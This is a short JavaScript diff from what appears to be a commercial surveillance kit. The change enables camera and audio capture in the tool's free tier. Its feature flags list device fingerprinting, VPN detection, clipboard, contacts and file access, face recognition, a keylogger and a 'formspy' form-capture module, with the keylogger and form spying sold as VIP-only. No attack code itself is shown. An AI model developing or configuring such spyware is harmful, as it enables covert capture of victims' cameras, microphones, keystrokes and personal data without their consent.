@@ -44,7 +44,7 @@ const DEFAULT_PAGE_CONFIG = {
 };
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false };
+const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false };
 // These features are ALWAYS paid-VIP only — never free
 const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy']);
 
